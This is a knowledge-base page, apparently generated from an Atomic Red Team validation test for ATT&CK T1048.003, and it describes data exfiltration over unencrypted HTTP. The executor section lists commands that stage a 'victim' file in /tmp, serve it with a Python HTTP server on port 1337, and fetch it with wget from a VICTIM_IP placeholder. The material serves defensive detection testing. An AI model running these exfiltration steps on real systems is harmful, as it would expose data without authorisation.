---
atomic_guid: "1d1abbd6-a3d3-4b2e-bef5-c59293f46eff"
title: "Exfiltration Over Alternative Protocol - HTTP"
framework: "atomic"
generated: "true"
attack_technique_id: "T1048.003"
attack_technique_name: "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.yaml"
build_date: "2026-04-26 14:38:39"
executor: "manual"
aliases:
  - "1d1abbd6-a3d3-4b2e-bef5-c59293f46eff"
  - "Exfiltration Over Alternative Protocol - HTTP"
platforms:
  - "macos"
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Exfiltration Over Alternative Protocol - HTTP

A firewall rule (ipfw,pf,iptables or firewalld) will be needed to allow exfiltration on port 1337.

Upon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.

## Metadata

- Atomic GUID: 1d1abbd6-a3d3-4b2e-bef5-c59293f46eff
- Technique: T1048.003: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
- Platforms: macos, linux
- Executor: manual
- Source Path: atomics/T1048.003/T1048.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol|T1048.003]]

## Executor

- name: manual
- steps: 1. Victim System Configuration:

    mkdir /tmp/victim-staging-area
    echo "this file will be exfiltrated" > /tmp/victim-staging-area/victim-file.txt

2. Using Python to establish a one-line HTTP server on victim system:

    cd /tmp/victim-staging-area
    python -m SimpleHTTPServer 1337

3. To retrieve the data from an adversary system:

    wget http://VICTIM_IP:1337/victim-file.txt


## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.yaml)
